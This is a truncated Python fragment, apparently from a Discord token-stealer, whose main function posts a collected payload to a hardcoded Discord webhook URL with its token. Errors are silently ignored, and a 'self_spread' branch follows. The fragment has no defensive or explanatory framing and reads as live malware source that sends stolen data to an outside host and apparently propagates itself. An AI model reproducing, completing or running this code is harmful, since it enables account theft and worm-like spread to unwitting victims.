...
def main():
    ...
    try:
        urlopen(Request("https://discordapp.com/api/webhooks/859832360568881162/smWxJxrAQxjuylAFuPUg4ej_8s9XT32kcctYxNmbFMI7pz83yuepzykvDwPR33KVXmnn", data=dumps(webhook).encode(), headers=getheaders()))
    except:
        pass
    if self_spread:
